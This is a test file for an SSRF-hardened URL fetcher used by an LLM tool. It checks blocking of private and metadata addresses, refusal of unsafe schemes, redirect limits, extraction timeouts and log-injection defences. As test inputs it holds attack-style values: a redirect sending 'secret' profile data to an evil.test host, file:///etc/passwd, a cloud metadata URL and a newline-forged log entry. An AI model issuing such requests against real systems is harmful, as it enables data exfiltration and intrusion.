import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createFetcher, checkUrl, isBlockedAddress, ownAddresses, htmlToText, parsePages, slice, LIMITS } from '../server/llm/fetch-url.mjs';

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'rokhan-fetch-'));
const PUBLIC = '93.184.216.34';
const resolver = async (host) => (host === 'intern.test' ? ['10.1.2.3'] : host === 'dual.test' ? [PUBLIC, '127.0.0.1'] : [PUBLIC]);
const html = (body) => ({ status: 200, headers: { 'content-type': 'text/html; charset=utf-8' }, body: Buffer.from(body) });

/** A fetcher whose network is the `routes` map: url -> response, or a function of the call count. */
const fetcher = (routes, extra = {}) => {
  const calls = [];
  const dataDir = tmp();
  const request = async (url) => {
    calls.push(url.toString());
    const r = routes[url.toString()];
    if (!r) return { status: 404, headers: {}, body: Buffer.alloc(0) };
    return typeof r === 'function' ? r(calls.length) : r;
  };
  return { fetchUrl: createFetcher({ dataDir, resolver, request, ...extra }), calls, dataDir };
};

/** A minimal valid PDF with one line of text per page. */
function makePdf(pages) {
  const objs = ['<< /Type /Catalog /Pages 2 0 R >>', null, '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>'];
  const kids = [];
  for (const text of pages) {
    const stream = `BT /F1 12 Tf 20 100 Td (${text}) Tj ET`;
    kids.push(`${objs.length + 1} 0 R`);
    objs.push(`<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 200] /Contents ${objs.length + 2} 0 R /Resources << /Font << /F1 3 0 R >> >> >>`);
    objs.push(`<< /Length ${stream.length} >>\nstream\n${stream}\nendstream`);
  }
  objs[1] = `<< /Type /Pages /Kids [${kids.join(' ')}] /Count ${pages.length} >>`;
  let out = '%PDF-1.4\n';
  const offsets = objs.map((o, i) => { const at = out.length; out += `${i + 1} 0 obj\n${o}\nendobj\n`; return at; });
  const xref = out.length;
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(out, 'latin1');
}

test('private, loopback and link-local addresses are blocked', () => {
  for (const ip of ['127.0.0.1', '10.0.0.5', '172.16.0.1', '172.31.255.1', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '224.0.0.1', '::1', '::', 'fe80::1', 'fc00::1', 'fd12::1', '::ffff:127.0.0.1', '::ffff:10.0.0.1', '64:ff9b::a00:1', '2002:7f00:1::', 'not-an-ip']) assert.equal(isBlockedAddress(ip), true, ip);
  for (const ip of [PUBLIC, '8.8.8.8', '172.32.0.1', '100.128.0.1', '2606:4700:4700::1111', '::ffff:8.8.8.8']) assert.equal(isBlockedAddress(ip), false, ip);
});

test('checkUrl refuses other schemes, credentials and hosts that resolve to a private address', async () => {
  for (const url of ['ftp://example.org/a', 'file:///etc/passwd', 'javascript:alert(1)', 'not a url']) await assert.rejects(checkUrl(url, resolver), { code: 'url' }, url);
  await assert.rejects(checkUrl('https://user:pw@example.org/', resolver), { code: 'url' });
  for (const url of ['http://127.0.0.1:8787/api', 'http://[::1]/', 'http://169.254.169.254/latest/meta-data', 'https://intern.test/', 'https://dual.test/']) await assert.rejects(checkUrl(url, resolver), { code: 'blocat' }, url);
  assert.deepEqual((await checkUrl('https://example.org/x', resolver)).addresses, [PUBLIC]);
});

test('a redirect to a private address is refused before it is requested', async () => {
  const { fetchUrl, calls, dataDir } = fetcher({ 'https://a.test/': { status: 302, headers: { location: 'http://192.168.0.10/admin' }, body: Buffer.alloc(0) } });
  await assert.rejects(fetchUrl({ url: 'https://a.test/' }), { code: 'blocat' });
  assert.deepEqual(calls, ['https://a.test/']);
  await assert.rejects(fetchUrl({ url: 'https://a.test/x' }).catch((e) => { throw e; }), { code: 'descarcare' }); // 404
  assert.match(fs.readFileSync(path.join(dataDir, 'logs', 'fetch.log'), 'utf8'), /\t"https:\/\/a\.test\/"\tblocat\t0\t"http:\/\/192\.168\.0\.10\/admin"\t-\n.*\t"https:\/\/a\.test\/x"\t404\t0\t"https:\/\/a\.test\/x"\t93\.184\.216\.34\n/s);
});

test('at most five redirects are followed', async () => {
  const hop = (n) => ({ status: 301, headers: { location: `/r${n}` }, body: Buffer.alloc(0) });
  const routes = { 'https://a.test/': hop(1), 'https://a.test/r6': html('<p>prea departe</p>') };
  for (let i = 1; i <= 5; i++) routes[`https://a.test/r${i}`] = hop(i + 1);
  const six = fetcher(routes);
  await assert.rejects(six.fetchUrl({ url: 'https://a.test/' }), /Prea multe redirecționări/);
  assert.equal(six.calls.length, 6);
  routes['https://a.test/r5'] = html('<p>am ajuns</p>');
  const five = fetcher(routes);
  const r = await five.fetchUrl({ url: 'https://a.test/' });
  assert.equal(r.text, 'am ajuns');
  assert.equal(r.url, 'https://a.test/r5');
});

test('htmlToText keeps headings, lists and table rows, drops scripts, styles and navigation', () => {
  const text = htmlToText(`<!doctype html><html><head><title>Ghid &amp; doze</title><style>p{color:red}</style></head><body>
    <nav><a href="/">Acasă</a></nav><script>alert("x")</script>
    <h1>Hipertensiunea</h1><p>Sulfat de&nbsp;magneziu:<br>doza de <b>încărcare</b> &#8211; 4&nbsp;g.</p>
    <ul><li>primul</li><li>al doilea</li></ul>
    <table><tr><th>Doză</th><th>Interval</th></tr><tr><td>1 g</td><td>la 7 minute</td></tr></table>
    <p>Vezi <a href="/docs/ghid.pdf">ghidul complet</a> sau <a href="/despre">despre noi</a>.</p>
    <footer>© 2019</footer></body></html>`, 'https://x.test/pagina');
  assert.equal(text, ['Ghid & doze', '', '# Hipertensiunea', '', 'Sulfat de magneziu:', 'doza de încărcare – 4 g.', '', '- primul', '- al doilea', '', 'Doză | Interval', '1 g | la 7 minute', '', 'Vezi ghidul complet (https://x.test/docs/ghid.pdf) sau despre noi.'].join('\n'));
});

test('paging helpers', () => {
  assert.deepEqual(parsePages('3-5'), [3, 4, 5]);
  assert.deepEqual(parsePages('7, 1,4-5'), [1, 4, 5, 7]);
  assert.equal(parsePages('5-3'), null);
  assert.equal(parsePages('abc'), null);
  assert.deepEqual(slice('aaaa\nbbbb\ncccc', 0, 11), { text: 'aaaa\nbbbb\n', end: 10 }); // prefers a line boundary
  assert.deepEqual(slice('abc', 5, 10), { text: '', end: 3 });
});

test('long text comes in slices with nextOffset, and the second slice comes from the cache', async () => {
  const body = Array.from({ length: 400 }, (_, i) => `rândul ${i + 1} cu ceva text`).join('\n');
  const { fetchUrl, calls } = fetcher({ 'https://a.test/lung.txt': { status: 200, headers: { 'content-type': 'text/plain' }, body: Buffer.from(body) } });
  const first = await fetchUrl({ url: 'https://a.test/lung.txt', max_caractere: 1000 });
  assert.equal(first.kind, 'text');
  assert.equal(first.cached, false);
  assert.equal(first.chars, body.length);
  assert.ok(first.text.length <= 1000 && first.text.endsWith('\n'));
  const second = await fetchUrl({ url: 'https://a.test/lung.txt', offset: first.nextOffset, max_caractere: 100_000 });
  assert.equal(second.cached, true);
  assert.equal(second.text.length, LIMITS.maxChars > body.length - first.nextOffset ? body.length - first.nextOffset : LIMITS.maxChars);
  assert.equal(first.text + second.text, body.slice(0, first.text.length + second.text.length));
  assert.equal(calls.length, 1);
  await assert.rejects(fetchUrl({ url: 'https://a.test/lung.txt', offset: -1 }), { code: 'argument' });
});

test('the cache expires after 24 hours', async () => {
  let clock = Date.parse('2026-11-22T10:00:00Z');
  const { fetchUrl, calls } = fetcher({ 'https://a.test/': html('<p>salut</p>') }, { now: () => clock });
  await fetchUrl({ url: 'https://a.test/' });
  clock += 23 * 3600 * 1000;
  assert.equal((await fetchUrl({ url: 'https://a.test/' })).cached, true);
  clock += 2 * 3600 * 1000;
  assert.equal((await fetchUrl({ url: 'https://a.test/' })).cached, false);
  assert.equal(calls.length, 2);
});

test('JSON is returned as it is; binary content is refused', async () => {
  const { fetchUrl } = fetcher({
    'https://a.test/api': { status: 200, headers: { 'content-type': 'application/json' }, body: Buffer.from('{"idlist":["1","2"]}') },
    'https://a.test/poza.png': { status: 200, headers: { 'content-type': 'image/png' }, body: Buffer.from([137, 80, 78, 71, 0, 0]) },
  });
  assert.deepEqual(await fetchUrl({ url: 'https://a.test/api' }).then((r) => [r.kind, r.text]), ['json', '{"idlist":["1","2"]}']);
  await assert.rejects(fetchUrl({ url: 'https://a.test/poza.png' }), { code: 'format' });
});

test('a PDF comes back with a [p. N] marker per page and can be read by page range', async () => {
  const pdf = makePdf(['Pagina unu doza 1 g', 'Pagina doi doza 2 g', 'Pagina trei doza 3 g']);
  const { fetchUrl, calls } = fetcher({ 'https://a.test/ghid.pdf': { status: 200, headers: { 'content-type': 'application/octet-stream' }, body: pdf } });
  const all = await fetchUrl({ url: 'https://a.test/ghid.pdf' });
  assert.equal(all.kind, 'pdf');
  assert.equal(all.pages, 3);
  assert.match(all.text, /^\[p\. 1\]\nPagina unu doza 1 g\n\n\[p\. 2\]\nPagina doi doza 2 g\n\n\[p\. 3\]\nPagina trei doza 3 g\n$/);
  const some = await fetchUrl({ url: 'https://a.test/ghid.pdf', pagini: '2-3' });
  assert.ok(some.text.startsWith('[p. 2]\nPagina doi') && !some.text.includes('Pagina unu'));
  assert.equal(some.cached, true);
  await assert.rejects(fetchUrl({ url: 'https://a.test/ghid.pdf', pagini: '9' }), /are 3 pagini/);
  await assert.rejects(fetchUrl({ url: 'https://a.test/ghid.pdf', pagini: 'x' }), { code: 'argument' });
  assert.equal(calls.length, 1);
});

// ---------- review finding 1: the provenance rule is decided before any DNS lookup ----------

test('a refused address is never resolved or requested, on the first hop and on a redirect, and the refusal is logged', async () => {
  const lookups = [];
  const { fetchUrl, calls, dataDir } = fetcher({
    'https://ok.test/redirect': { status: 302, headers: { location: 'https://date-din-profil.evil.test/c?d=secret' }, body: Buffer.alloc(0) },
    'https://ok.test/pagina': html('<p>salut</p>'),
  }, { resolver: async (host) => { lookups.push(host); return [PUBLIC]; } });
  const allow = (u) => u.hostname === 'ok.test';

  await assert.rejects(fetchUrl({ url: 'https://date-din-profil.evil.test/c?d=secret', allow }), { code: 'provenienta' });
  assert.deepEqual([lookups, calls], [[], []]);

  assert.equal((await fetchUrl({ url: 'https://ok.test/pagina', allow })).text, 'salut');
  await assert.rejects(fetchUrl({ url: 'https://ok.test/redirect', allow }), { code: 'provenienta' });
  assert.deepEqual(lookups, ['ok.test', 'ok.test'], 'the redirect target was not resolved');
  assert.deepEqual(calls, ['https://ok.test/pagina', 'https://ok.test/redirect']);

  await assert.rejects(fetchUrl({ url: 'https://ok.test/pagina', allow: () => false }), { code: 'provenienta' }); // a cached page too
  const log = fs.readFileSync(path.join(dataDir, 'logs', 'fetch.log'), 'utf8');
  assert.equal(log.split('\n').filter((l) => l.includes('\tprovenienta\t')).length, 3);
});

// ---------- review finding 3: extraction cannot hold the server's thread ----------

test('the reviewer\'s three pages are cut off by the time limit while the main thread keeps running; a PDF is bounded too', async () => {
  const pages = {
    'https://a.test/anchors': '<a href="x" '.repeat(Math.ceil(40_000 / 12)), // 64 s on the main thread before the fix
    'https://a.test/comments': '<!--'.repeat(100_000), // 21 s
    'https://a.test/scripts': '<script '.repeat(50_000), // 9 s
  };
  const { fetchUrl } = fetcher(Object.fromEntries(Object.entries(pages).map(([u, body]) => [u, html(body)])), { extractMs: 400 });
  let ticks = 0;
  const ticker = setInterval(() => { ticks++; }, 20);
  try {
    for (const url of Object.keys(pages)) {
      const t0 = Date.now();
      await assert.rejects(fetchUrl({ url }), { code: 'timeout' }, url);
      assert.ok(Date.now() - t0 < 3000, `${url} took ${Date.now() - t0} ms`);
    }
  } finally {
    clearInterval(ticker);
  }
  assert.ok(ticks >= 30, `the main thread ran only ${ticks} timer ticks during three conversions`);

  const pdf = fetcher({ 'https://a.test/ghid.pdf': { status: 200, headers: {}, body: makePdf(['Pagina unu']) } }, { extractMs: 1 });
  await assert.rejects(pdf.fetchUrl({ url: 'https://a.test/ghid.pdf' }), { code: 'timeout' });
  assert.equal(LIMITS.extractMs, 10_000);
});

// ---------- review finding 10: the machine's own addresses, three more IPv6 ranges ----------

test('the machine\'s own addresses and the local NAT64, IPv4-translated and Teredo ranges are blocked', async () => {
  for (const ip of ['64:ff9b:1::7f00:1', '64:ff9b:1:abcd::808:808', '::ffff:0:7f00:1', '::ffff:0:8.8.8.8', '2001:0:4136:e378:8000:63bf:3fff:fdd2', '2001::1']) assert.equal(isBlockedAddress(ip), true, ip);
  for (const ip of ['2001:4860:4860::8888', '64:ff9b:2::1', '2001:1::1']) assert.equal(isBlockedAddress(ip), false, ip);

  const own = ownAddresses({ eth0: [{ address: '203.0.113.7', family: 'IPv4' }, { address: '2A01:4F8::1', family: 'IPv6' }], lo: [{ address: '127.0.0.1', family: 'IPv4' }] });
  assert.equal(isBlockedAddress('203.0.113.7', own), true);
  assert.equal(isBlockedAddress('::ffff:203.0.113.7', own), true);
  assert.equal(isBlockedAddress('2a01:4f8:0:0:0:0:0:1', own), true); // the same address, spelled differently
  assert.equal(isBlockedAddress('203.0.113.8', own), false);
  assert.equal(isBlockedAddress('2a01:4f8::2', own), false);
  await assert.rejects(checkUrl('https://rokhan-vps.test/', async () => ['203.0.113.7'], null, own), { code: 'blocat' });
  await assert.rejects(checkUrl('http://203.0.113.7:8787/api/stare', resolver, null, own), { code: 'blocat' });

  for (const list of Object.values(os.networkInterfaces())) for (const a of list) assert.equal(isBlockedAddress(a.address), true, `this machine's ${a.address}`);
});

// ---------- review finding 11: the fetch log ----------

test('fetch.log quotes the parsed address, so newlines cannot forge a line, and records where the fetch ended', async () => {
  const forged = 'https://example.org/x\n2026-11-22T10:00:00.000Z\thttps://sogr.ro/forged-entry\t200\t1234';
  const { fetchUrl, dataDir } = fetcher({
    'https://a.example/start': { status: 302, headers: { location: 'https://b.example/final?leak=1' }, body: Buffer.alloc(0) },
    'https://b.example/final?leak=1': html('<p>gata</p>'),
    [new URL(forged).href]: html('<p>ok</p>'),
  }, { resolver: async (host) => (host === 'b.example' ? ['93.184.216.99'] : [PUBLIC]) });
  await fetchUrl({ url: 'https://a.example/start' });
  await fetchUrl({ url: forged });
  await fetchUrl({ url: 'https://a.example/start' }); // from the cache
  await assert.rejects(fetchUrl({ url: 'nu e\no adresă' }), { code: 'url' });

  const lines = fs.readFileSync(path.join(dataDir, 'logs', 'fetch.log'), 'utf8').trimEnd().split('\n').map((l) => l.split('\t'));
  assert.equal(lines.length, 4, 'one line per fetch');
  for (const l of lines) assert.equal(l.length, 6);
  assert.deepEqual(lines[0].slice(1), ['"https://a.example/start"', '200', '11', '"https://b.example/final?leak=1"', '93.184.216.99']);
  assert.deepEqual(lines[1].slice(1), [JSON.stringify(new URL(forged).href), '200', '9', JSON.stringify(new URL(forged).href), PUBLIC]);
  assert.deepEqual(lines[2].slice(1), ['"https://a.example/start"', 'cache', '11', '"https://b.example/final?leak=1"', '-']);
  assert.deepEqual(lines[3].slice(1), ['"nu e\\no adresă"', 'url', '0', '-', '-']);
});
